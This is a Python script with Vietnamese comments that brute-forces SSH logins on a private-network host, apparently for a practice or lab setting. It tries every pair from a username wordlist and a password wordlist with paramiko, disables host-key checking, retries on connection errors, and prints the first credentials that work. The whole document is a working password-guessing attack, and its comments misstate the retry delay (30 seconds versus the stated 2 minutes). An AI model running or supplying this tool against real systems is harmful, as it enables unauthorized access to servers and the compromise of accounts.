import paramiko
import time

host = "192.168.155.183"
port = 22

# Tạo một đối tượng SSHClient   
client = paramiko.SSHClient()
# Không yêu cầu xác thực máy chủ
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

retry_delay = 30  # Đợi 2 phút trước khi thử lại kết nối

with open("username_wordlist.txt", "r") as user_List:
    for user in user_List:
        user = user.strip()
        print(f"(+++) Try username: {user}")
        pass_List = []
        with open("passwd_wordlist.txt", "r") as file:
            for line in file:
                pass_List.append(line.strip())

            found_username = None  # Khởi tạo biến để lưu trữ username được tìm thấy
            found_password = None  # Khởi tạo biến để lưu trữ mật khẩu được tìm thấy

            i = 0
            while i < len(pass_List):
                password = pass_List[i].strip()
                try:
                    print(f"(+) Try password: {password}")
                    # Kết nối đến máy chủ
                    client.connect(host, port, user, password)
                    found_username = user
                    found_password = password
                    break
                except paramiko.ssh_exception.AuthenticationException:
                    print("error pass")
                except Exception as e:
                    print(f"Error: {e}. Retrying in {retry_delay} seconds...")
                    time.sleep(retry_delay)  # Đợi 2 phút trước khi thử lại
                    i -= 1
                i += 1
            if found_password is not None:
                print("*_* Found successful password: " + found_password + " .for username : " + found_username)
                break